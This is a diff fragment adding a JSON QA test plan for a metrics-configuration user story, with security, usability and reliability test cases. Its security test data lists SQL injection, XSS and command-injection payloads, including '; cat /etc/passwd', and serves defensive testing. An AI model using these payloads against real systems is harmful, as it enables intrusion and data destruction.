+        "No malicious scripts are stored or executed",
+        "All injection attempts are logged in security monitoring system",
+        "Application remains functional and secure"
+      ],
+      "testData": "SQL Injection payloads: [\"' OR '1'='1\", \"'; DROP TABLE metrics;--\", \"' UNION SELECT * FROM users--\"], XSS payloads: [\"<script>alert('XSS')</script>\", \"<img src=x onerror=alert(1)>\", \"javascript:alert('XSS')\"], Command Injection: [\"$(whoami)\", \"; cat /etc/passwd\", \"| ls -la\"]",
+      "toolsRequired": [
+        "OWASP ZAP or Burp Suite for injection testing",
+        "SQLMap for automated SQL injection detection",
+        "XSS payload lists (OWASP XSS Filter Evasion Cheat Sheet)",
+        "Database monitoring tools to verify query execution"
+      ],
+      "estimatedTime": "60 minutes",
+      "automationFeasibility": "High",
+      "riskScore": 9.4,
+      "complianceTag": "OWASP-A03, PCI-DSS-6.5.1, SOC2-CC7.1"
+    },
+    {
+      "id": "SEC-INFO-001",
+      "title": "Information Disclosure via API Response and Error Messages",
+      "category": "security",
+      "subCategory": "STRIDE-Information Disclosure",
+      "priority": "High",
+      "description": "Verify that the metrics configuration API and error handling mechanisms do not expose sensitive information such as database schema, internal paths, user data, or system configuration details. Tests OWASP A02 cryptographic failures and information disclosure threats.",
+      "preconditions": [
+        "Application is running in production-like environment",
+        "API endpoint POST /api/metrics/configure is accessible",
+        "Error handling middleware is configured",
+        "User is authenticated as Performance Analyst"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Send a malformed POST request to /api/metrics/configure with invalid JSON payload: {\"metricName\": \"Test\", \"formula\": } and analyze the error response",
+          "expectedResult": "Generic error message is returned (e.g., 'Invalid request format') without exposing stack traces, file paths, or framework version information"
+        },
+        {
+          "step": 2,
+          "action": "Attempt to create a metric with duplicate name that violates unique constraint and examine the error response for database schema information",
+          "expectedResult": "Error message states 'Metric name already exists' without revealing table names, column names, or database type (e.g., no 'UNIQUE constraint violation on metrics.metric_name')"
+        },
+        {
+          "step": 3,
+          "action": "Send GET request to /api/metrics/configure without authentication token and analyze response headers and body for information leakage",
+          "expectedResult": "Response returns HTTP 401 with minimal information, no Server header revealing technology stack, no X-Powered-By headers, and no detailed authentication mechanism hints"
+        },
+        {
+          "step": 4,
+          "action": "Trigger a server error by sending extremely large payload (>10MB) or causing timeout, then inspect error response for internal system details",
+          "expectedResult": "Custom error page is displayed with generic message, no stack traces, no internal IP addresses, no file system paths, and error is logged server-side only"
+        },
+        {
+          "step": 5,
+          "action": "Attempt to retrieve other users' metric configurations by manipulating userId parameter in GET request: /api/metrics/configure?userId=<other_user_id>",
+          "expectedResult": "API validates authorization and returns HTTP 403 Forbidden without disclosing whether the userId exists or any details about other users' configurations"
+        },
+        {
+          "step": 6,
+          "action": "Verify that API responses do not include sensitive metadata in headers such as database version, framework details, or internal service names",
+          "expectedResult": "Response headers contain only necessary information (Content-Type, Content-Length), security headers are present (X-Content-Type-Options, X-Frame-Options), and no technology fingerprinting is possible"
+        }
+      ],
+      "postconditions": [
+        "No sensitive system information is disclosed through any channel",
+        "Error messages remain generic and user-friendly",
+        "Security headers are properly configured",
+        "All error details are logged securely server-side for debugging"
+      ],
+      "testData": "Malformed payloads: [{\"metricName\": null}, {\"formula\": \"<script>\"}, {invalid JSON}], Large payload: 15MB JSON file, Invalid userId values: [-1, 999999, 'admin', '<script>alert(1)</script>']",
+      "toolsRequired": [
+        "Burp Suite or OWASP ZAP for request manipulation",
+        "cURL or Postman for API testing",
+        "Browser Developer Tools for header inspection",
+        "Nikto or Wappalyzer for technology fingerprinting detection"
+      ],
+      "estimatedTime": "40 minutes",
+      "automationFeasibility": "High",
+      "riskScore": 7.6,
+      "complianceTag": "OWASP-A02, OWASP-A05, PCI-DSS-6.5.5, SOC2-CC6.7"
+    }
+  ],
+  "usability": [
+    {
+      "id": "UX-H01-001",
+      "title": "Verify system provides real-time feedback during metric configuration save operation",
+      "category": "usability",
+      "subCategory": "Nielsen-H01-Visibility of System Status",
+      "priority": "Critical",
+      "description": "Test whether the system provides clear, immediate feedback to users during the metric configuration save process, including loading indicators, progress status, and confirmation messages. This ensures users understand what the system is doing at all times.",
+      "preconditions": [
+        "User is logged in as Performance Analyst with metric configuration permissions",
+        "User has navigated to the metrics configuration page",
+        "At least one metric has been selected or created"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Select 2-3 predefined metrics from the dropdown menu",
+          "expectedResult": "Selected metrics are visually highlighted or marked with checkboxes showing selection state"
+        },
+        {
+          "step": 2,
+          "action": "Click the 'Save Configuration' button",
+          "expectedResult": "System immediately displays a loading indicator (spinner/progress bar) and disables the save button to prevent duplicate submissions"
+        },
+        {
+          "step": 3,
+          "action": "Observe the system behavior during the save operation",
+          "expectedResult": "Loading indicator remains visible throughout the save process with status text like 'Saving your configuration...'"
+        },
+        {
+          "step": 4,
+          "action": "Wait for the save operation to complete",
+          "expectedResult": "System displays a clear success message (e.g., 'Configuration saved successfully') with visual confirmation (green checkmark or toast notification)"
+        },
+        {
+          "step": 5,
+          "action": "Attempt to save a configuration when network is slow (simulate 3G connection)",
+          "expectedResult": "System shows progress indicator throughout the extended wait time and does not appear frozen or unresponsive"
+        }
+      ],
+      "postconditions": [
+        "Configuration is successfully saved to the database",
+        "User receives clear confirmation of save status",
+        "Recommendation: Implement multi-stage feedback (validating → saving → saved) with estimated time for operations exceeding 1 second",
+        "Recommendation: Add a progress percentage indicator for operations taking longer than 3 seconds",
+        "Recommendation: Ensure all interactive elements show hover/active states to confirm clickability"
+      ],
+      "testData": "Predefined metrics: Response Time, Throughput, Error Rate, CPU Usage",
+      "toolsRequired": [
+        "Browser Developer Tools (Network throttling)",
+        "Screen recording software for documentation"
+      ],
+      "estimatedTime": "20 minutes",
+      "automationFeasibility": "Medium",
+      "riskScore": 4,
+      "complianceTag": "Nielsen-H01"
+    },
+    {
+      "id": "UX-H03-002",
+      "title": "Verify user can easily undo/cancel metric configuration changes without data loss",
+      "category": "usability",
+      "subCategory": "Nielsen-H03-User Control and Freedom",
+      "priority": "Critical",
+      "description": "Test whether users have clear exit paths and can undo their actions when configuring metrics. Users should be able to cancel operations, revert changes, and navigate away without losing work unintentionally. This validates that users feel in control of the system.",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "User has existing saved metric configurations",
+        "Metrics configuration page is loaded successfully"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Select 3 predefined metrics and create 1 custom metric with name 'Custom_Response_Time' and description",
+          "expectedResult": "All 4 metrics are displayed in the configuration workspace with clear visual indication of unsaved changes"
+        },
+        {
+          "step": 2,
+          "action": "Look for and click a 'Cancel' or 'Reset' button without saving",
+          "expectedResult": "System displays a confirmation dialog: 'You have unsaved changes. Are you sure you want to cancel?' with options: 'Discard Changes', 'Continue Editing', 'Save and Exit'"
+        },
+        {
+          "step": 3,
+          "action": "Click 'Continue Editing' in the confirmation dialog",
+          "expectedResult": "User returns to the configuration page with all unsaved changes intact (all 4 metrics still selected/created)"
+        },
+        {
+          "step": 4,
+          "action": "Delete one of the selected predefined metrics, then immediately look for an 'Undo' option",
+          "expectedResult": "System provides an 'Undo' button or Ctrl+Z keyboard shortcut that restores the deleted metric"
+        },
+        {
+          "step": 5,
+          "action": "Edit an existing saved metric's name, then click 'Cancel' or navigate away using browser back button",
+          "expectedResult": "System prompts with unsaved changes warning and allows user to discard changes, returning the metric to its original state"
+        },
+        {
+          "step": 6,
+          "action": "Attempt to close the browser tab while unsaved changes exist",
+          "expectedResult": "Browser displays native 'Leave site?' confirmation preventing accidental data loss"
+        }
+      ],
+      "postconditions": [
+        "User can safely exit without saving and no unwanted changes are persisted",
+        "Original configuration remains unchanged when user cancels",
+        "Recommendation: Implement a visible 'Undo/Redo' button stack for the last 5-10 actions",
+        "Recommendation: Add auto-save to draft with clear indication: 'Draft saved at [timestamp]'",
+        "Recommendation: Provide a 'Restore Previous Version' option to revert to last saved configuration",
+        "Recommendation: Use consistent placement for Cancel buttons (typically bottom-left or top-right with clear visual distinction from Save)"
+      ],
+      "testData": "Existing configuration: 'Team A Metrics' with Response Time, Error Rate, Throughput; Custom metric: Custom_Response_Time with formula 'avg(response_time_ms)'",
+      "toolsRequired": [
+        "Browser with JavaScript console for event monitoring",
+        "Test data with pre-existing configurations"
+      ],
+      "estimatedTime": "25 minutes",
+      "automationFeasibility": "Medium",
+      "riskScore": 4,
+      "complianceTag": "Nielsen-H03"
+    },
+    {
+      "id": "UX-H05-003",
+      "title": "Verify system prevents errors through validation and constraints during metric configuration",
+      "category": "usability",
+      "subCategory": "Nielsen-H05-Error Prevention",
+      "priority": "High",
+      "description": "Test whether the system proactively prevents errors before they occur through input validation, constraints, helpful defaults, and confirmation dialogs for destructive actions. This reduces user frustration and support burden by catching issues before submission.",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "Metrics configuration page is accessible",
+        "Database contains existing metric names for duplicate validation"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Attempt to create a custom metric with a name that already exists in the system (e.g., 'Response_Time')",
+          "expectedResult": "System displays inline validation error immediately after field loses focus: 'This metric name already exists. Please choose a unique name.' Save button remains disabled."
+        },
+        {
+          "step": 2,
+          "action": "Try to create a custom metric leaving the metric name field empty and click Save",
+          "expectedResult": "Required fields are clearly marked with asterisks (*), and system prevents submission with message: 'Please complete all required fields' highlighting the empty name field in red"
+        },
+        {
+          "step": 3,
+          "action": "Enter special characters or SQL injection attempts in the metric name field (e.g., 'Test'; DROP TABLE--')",
+          "expectedResult": "System displays real-time validation: 'Metric name can only contain letters, numbers, and underscores' and sanitizes/blocks invalid characters as user types"
+        },
+        {
+          "step": 4,
+          "action": "Select a critical existing metric that is used in active dashboards and click 'Delete'",
+          "expectedResult": "System displays a prominent warning dialog: 'This metric is currently used in 3 dashboards. Deleting it will affect these dashboards. Are you sure?' with 'Cancel' as the default focused button and 'Delete' in red"
+        },
+        {
+          "step": 5,
+          "action": "Try to save a configuration without selecting any metrics",
+          "expectedResult": "System prevents saving and displays message: 'Please select at least one metric before saving' with suggestion to select from predefined metrics"
+        },
+        {
+          "step": 6,
+          "action": "Enter a metric name exceeding reasonable length (e.g., 200 characters)",
+          "expectedResult": "Input field has character limit (e.g., 50 chars) with counter showing 'X/50 characters' and prevents additional input beyond limit"
+        }
+      ],
+      "postconditions": [
+        "No invalid configurations are saved to the database",
+        "User receives clear, actionable guidance before errors occur",
+        "Recommendation: Implement real-time validation with green checkmarks for valid inputs to provide positive reinforcement",
+        "Recommendation: Add helpful placeholder text in input fields (e.g., 'Enter unique metric name (e.g., team_response_time)')",
+        "Recommendation: Provide 'Suggested Names' based on existing patterns when duplicate is detected",
+        "Recommendation: Show dependency warnings before deletion with option to view affected dashboards",
+        "Recommendation: Use constraint-based UI (disable delete for system-critical metrics, show dropdown of valid options instead of free text where possible)"
+      ],
+      "testData": "Existing metrics: Response_Time, Error_Rate, Throughput, CPU_Usage; Test inputs: duplicate names, empty strings, special characters (!@#$%^&*), SQL injection strings, excessively long strings (200+ chars)",
+      "toolsRequired": [
+        "Browser Developer Tools for input validation testing",
+        "SQL injection test string library",
+        "Database with pre-populated metric names"
+      ],
+      "estimatedTime": "30 minutes",
+      "automationFeasibility": "High",
+      "riskScore": 3,
+      "complianceTag": "Nielsen-H05"
+    }
+  ],
+  "reliability": [
+    {
+      "id": "REL-DEP-001",
+      "title": "Metrics Database Unavailability During Configuration Save - Graceful Degradation Validation",
+      "category": "reliability",
+      "subCategory": "Dependency Resilience - Database Failure",
+      "priority": "Critical",
+      "description": "Validate system resilience when the metrics database becomes unavailable during a save operation. Test circuit breaker activation, user notification, and data integrity preservation. Ensure no partial writes occur and user receives clear feedback with retry options.",
+      "preconditions": [
+        "User authenticated as Performance Analyst with metric configuration permissions",
+        "Metrics configuration page loaded successfully",
+        "User has created/modified at least 3 custom metrics ready to save",
+        "Database connection monitoring tools configured",
+        "Circuit breaker pattern implemented for database operations"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Configure 3 custom metrics with unique names and validation rules on the metrics configuration page",
+          "expectedResult": "Metrics configuration form accepts all inputs and displays preview of configurations"
+        },
+        {
+          "step": 2,
+          "action": "Using chaos engineering tool (e.g., Gremlin, Chaos Monkey), inject database failure by stopping the metrics database service",
+          "expectedResult": "Database becomes unavailable, connection pool reports failure state"
+        },
+        {
+          "step": 3,
+          "action": "Click 'Save Configuration' button to persist the metrics",
+          "expectedResult": "System detects database unavailability within 3 seconds, circuit breaker opens, user receives error message: 'Unable to save configuration. Database temporarily unavailable. Your changes are preserved locally.'"
+        },
+        {
+          "step": 4,
+          "action": "Verify no partial data is written to database and transaction is rolled back completely",
+          "expectedResult": "Database query confirms zero partial records created, transaction log shows complete rollback"
+        },
+        {
+          "step": 5,
+          "action": "Restore database service to healthy state",
+          "expectedResult": "Database connection pool recovers, circuit breaker transitions to half-open state after 30 seconds"
+        },
+        {
+          "step": 6,
+          "action": "Click 'Retry' button on the error notification or re-submit the save operation",
+          "expectedResult": "All 3 metrics save successfully with confirmation message, MTTR < 60 seconds from failure detection to successful recovery"
+        }
+      ],
+      "postconditions": [
+        "All 3 custom metrics persisted correctly in database",
+        "No orphaned or partial records exist",
+        "Circuit breaker returns to closed state",
+        "System availability maintained at 99.9% SLA",
+        "User session and unsaved data preserved throughout failure"
+      ],
+      "testData": "Custom Metrics: {metric1: {name: 'Team_Velocity_Q4', formula: 'SUM(story_points)/sprint_days', type: 'calculated'}, metric2: {name: 'Defect_Density_Rate', formula: 'defects/KLOC', type: 'ratio'}, metric3: {name: 'Cycle_Time_Average', formula: 'AVG(completion_date - start_date)', type: 'time-based'}}",
+      "toolsRequired": [
+        "Chaos Engineering Platform (Gremlin, Chaos Toolkit, or Litmus)",
+        "Database monitoring tool (DataDog, New Relic)",
+        "Transaction log analyzer",
+        "Network packet analyzer (Wireshark)",
+        "APM tool for circuit breaker state monitoring"
+      ],
+      "estimatedTime": "45 minutes",
+      "automationFeasibility": "High",
+      "riskScore": 9,
+      "complianceTag": "SOC2-CC7.2-Availability"
+    },
+    {
+      "id": "REL-CHAOS-002",
+      "title": "API Endpoint Latency Injection - Performance Degradation Under Network Stress",
+      "category": "reliability",
+      "subCategory": "Chaos Engineering - Network Latency Injection",
+      "priority": "Critical",
+      "description": "Execute chaos experiment injecting 5000ms latency to POST /api/metrics/configure endpoint to validate timeout handling, user experience degradation, and system recovery. Test hypothesis: System maintains usability with graceful timeout at 10 seconds and provides user feedback when API latency exceeds 3 seconds.",
+      "preconditions": [
+        "Baseline steady state established: API response time < 2 seconds under normal conditions",
+        "Performance Analyst logged in with active session",
+        "Metrics configuration page fully loaded",
+        "Chaos experiment blast radius limited to metrics configuration service only",
+        "Monitoring dashboards active for SLI tracking (latency p95, p99, error rate)"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Establish steady state baseline by successfully saving a metric configuration and recording response time",
+          "expectedResult": "Metric saves in < 2 seconds, success confirmation displayed, baseline SLI recorded: p95 latency = 1.8s, error rate = 0%"
+        },
+        {
+          "step": 2,
+          "action": "Define chaos hypothesis: 'When API latency increases to 5000ms, system will timeout gracefully at 10s, display loading indicator after 3s, and allow user to cancel operation'",
+          "expectedResult": "Hypothesis documented with success criteria and rollback plan defined"
+        },
+        {
+          "step": 3,
+          "action": "Inject 5000ms network latency to POST /api/metrics/configure endpoint using chaos tool with 100% traffic affected for 3 minutes",
+          "expectedResult": "Latency injection active, monitoring confirms API response time increased to 5000-5500ms range"
+        },
+        {
+          "step": 4,
+          "action": "Attempt to save a new custom metric configuration during latency injection period",
+          "expectedResult": "Loading indicator appears after 3 seconds, 'Cancel' button becomes available, request times out at 10 seconds with message: 'Request taking longer than expected. Please try again or contact support.'"
+        },
+        {
+          "step": 5,
+          "action": "Verify system does not hang, crash, or create duplicate requests during timeout period",
+          "expectedResult": "UI remains responsive, no duplicate POST requests sent (verified in network logs), user can navigate away or retry, memory usage stable"
+        },
+        {
+          "step": 6,
+          "action": "Remove latency injection and validate system returns to steady state within 30 seconds",
+          "expectedResult": "API latency returns to < 2 seconds, subsequent save operations succeed normally, MTTR = 30 seconds, no residual degradation observed"
+        },
+        {
+          "step": 7,
+          "action": "Verify SLO compliance: System availability remained > 99.5% during experiment",
+          "expectedResult": "Availability SLO met: 99.7% uptime maintained, error budget consumption within acceptable limits (< 0.3% degradation)"
+        }
+      ],
+      "postconditions": [
+        "System fully recovered to baseline performance",
+        "No data corruption or partial saves occurred",
+        "All monitoring alerts cleared",
+        "Chaos experiment results documented with hypothesis validation outcome",
+        "MTBF tracking updated with experiment data"
+      ],
+      "testData": "Test Metric: {name: 'Chaos_Test_Metric_Latency', type: 'predefined', category: 'throughput', threshold: 85}",
+      "toolsRequired": [
+        "Chaos Engineering Platform with network latency injection (Toxiproxy, Pumba, Chaos Mesh)",
+        "APM monitoring (New Relic, Dynatrace, AppDynamics)",
+        "Browser DevTools Network tab for request tracking",
+        "Prometheus/Grafana for SLI/SLO dashboards",
+        "Log aggregation tool (ELK Stack, Splunk)"
+      ],
+      "estimatedTime": "60 minutes",
+      "automationFeasibility": "Medium",
+      "riskScore": 8,
+      "complianceTag": "SOC2-CC7.1-Performance"
+    },
+    {
+      "id": "REL-CB-003",
+      "title": "Circuit Breaker State Transitions - Retry Logic with Exponential Backoff Validation",
+      "category": "reliability",
+      "subCategory": "Circuit Breaker & Retry Logic",
+      "priority": "High",
+      "description": "Validate circuit breaker pattern implementation for metrics configuration service including all state transitions (Closed → Open → Half-Open → Closed), retry policy with exponential backoff (initial: 1s, max: 32s), and failure threshold configuration. Ensure system prevents cascading failures and recovers automatically.",
+      "preconditions": [
+        "Circuit breaker configured with thresholds: failure rate > 50% over 10 requests triggers open state",
+        "Retry policy configured: max 5 retries, exponential backoff starting at 1 second, max backoff 32 seconds",
+        "Half-open state allows 3 test requests before state decision",
+        "Metrics configuration service instrumented with circuit breaker telemetry",
+        "User authenticated as Performance Analyst"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Verify circuit breaker initial state is CLOSED by successfully saving 5 different metric configurations",
+          "expectedResult": "All 5 save operations succeed with response time < 2 seconds, circuit breaker state = CLOSED, success rate = 100%"
+        },
+        {
+          "step": 2,
+          "action": "Simulate backend service failure by returning 503 Service Unavailable for POST /api/metrics/configure endpoint",
+          "expectedResult": "Service returns 503 errors consistently, failure injection active"
+        },
+        {
+          "step": 3,
+          "action": "Attempt to save metric configurations 10 times in rapid succession to trigger circuit breaker threshold",
+          "expectedResult": "First 10 requests fail with 503 errors, circuit breaker detects 100% failure rate over threshold, state transitions to OPEN after 10th failure, subsequent requests fail immediately with 'Circuit breaker OPEN' message without hitting backend"
+        },
+        {
+          "step": 4,
+          "action": "Verify retry logic executes with exponential backoff: observe retry attempts at 1s, 2s, 4s, 8s, 16s intervals",
+          "expectedResult": "System logs show retry attempts with correct backoff intervals: attempt 1 (immediate), attempt 2 (+1s), attempt 3 (+2s), attempt 4 (+4s), attempt 5 (+8s), max retries reached, total elapsed time ~15 seconds"
+        },
+        {
+          "step": 5,
+          "action": "Wait for circuit breaker timeout period (30 seconds) to allow transition to HALF-OPEN state",
+          "expectedResult": "After 30 seconds, circuit breaker automatically transitions to HALF-OPEN state, monitoring shows state change event logged"
+        },
+        {
+          "step": 6,
+          "action": "Restore backend service to healthy state and attempt to save a metric configuration",
+          "expectedResult": "In HALF-OPEN state, system allows test request through, request succeeds with 200 OK response in < 2 seconds"
+        },
+        {
+          "step": 7,
+          "action": "Execute 3 consecutive successful save operations to validate circuit breaker closure",
+          "expectedResult": "All 3 test requests succeed, circuit breaker transitions from HALF-OPEN to CLOSED state, normal operation resumed, MTTR = 45 seconds (30s timeout + 15s recovery validation)"
+        },
+        {
+          "step": 8,
+          "action": "Verify no data loss occurred and all failed requests during OPEN state were properly queued or rejected with user notification",
+          "expectedResult": "User received clear notifications for all failed attempts, no silent failures, no duplicate data created, system integrity maintained"
+        }
+      ],
+      "postconditions": [
+        "Circuit breaker in CLOSED state with normal operation",
+        "All telemetry data captured for state transitions",
+        "Retry attempt logs available for analysis",
+        "System availability SLO maintained > 99.5%",
+        "MTTR documented and within acceptable threshold (< 60 seconds)"
+      ],
+      "testData": "Test Metrics for Circuit Breaker: [{name: 'CB_Test_Metric_1', type: 'custom'}, {name: 'CB_Test_Metric_2', type: 'custom'}, {name: 'CB_Test_Metric_3', type: 'custom'}]",
+      "toolsRequired": [
+        "Circuit breaker library monitoring (Hystrix Dashboard, Resilience4j Metrics)",
+        "Service mesh with fault injection (Istio, Linkerd)",
+        "Log analysis tool for retry pattern validation",
+        "Time-series database for state transition tracking",
+        "API mocking tool (WireMock, MockServer) for controlled failures"
+      ],
+      "estimatedTime": "50 minutes",
+      "automationFeasibility": "High",
+      "riskScore": 7,
+      "complianceTag": "SOC2-CC7.2-SystemRecovery"
+    }
+  ],
+  "selectedTypes": {
+    "functional": true,
+    "edgeCases": true,
+    "negative": true,
+    "accessibility": true,
+    "performance": true,
+    "security": true,
+    "usability": true,
+    "reliability": true
+  },
+  "userStoryObject": {
+    "id": "ado-14136",
+    "title": "As Performance Analyst, I want to configure performance metrics to achieve tailored monitoring for my team",
+    "description": "<div>CONTEXT &amp; BACKGROUND:\nThe ability to configure performance metrics is crucial for analyzing team performance effectively. This story addresses the need for flexibility in metric selection.\n\nCURRENT STATE:\nCurrently, performance metrics are fixed and do not cater to specific team needs, leading to irrelevant data.\n\nDESIRED STATE:\nAfter implementation, analysts can select and configure metrics that align with team objectives.\n\nKEY FUNCTIONALITY:\n• Ability to select predefined metrics\n• Option to create custom metrics\n• Edit existing metrics\n• Delete metrics no longer in use\n• Save configurations for future use\n\nUSER INTERACTION FLOW:\n1. User navigates to the metrics configuration page.\n2. User selects predefined metrics from a dropdown.\n3. User creates a custom metric by entering details.\n4. User saves the configuration.\n5. System confirms the metrics have been saved.\n\nTECHNICAL CONSIDERATIONS:\n• Data source: Metrics database table\n• Validation rules: Ensure metric names are unique\n• API endpoints: POST /api/metrics/configure\n• Security: Role-based access control for metric configuration\n• Performance: Load time under 2 seconds for metrics page\n\nOUT OF SCOPE:\n• Historical data analysis\n\nSUCCESS METRICS:\n• 90% of users report satisfaction with metric configuration options. </div><br><div><strong>Persona:</strong> Performance Analyst (Performance Analyst) </div>",
+    "acceptanceCriteria": "<div><strong>Criteria 1:</strong> Users can select from a list of predefined metrics to monitor. </div><br><div><strong>Criteria 2:</strong> Users can create custom metrics based on specific business requirements. </div><br><div><strong>Criteria 3:</strong> The system allows users to edit and delete existing metrics. </div><br>",
+    "adoWorkItemId": 14136,
+    "state": "New",
+    "assignedTo": "Unassigned",
+    "createdDate": "2026-01-29T09:29:14.987Z",
+    "priority": 2,
+    "storyPoints": 5,
+    "tags": "",
+    "epicId": "epic-13801",
+    "featureId": "feature-13825",
+    "source": "ado",
+    "adoUrl": "https://dev.azure.com/QS001/Venus/_workitems/edit/14136"
+  }
+}
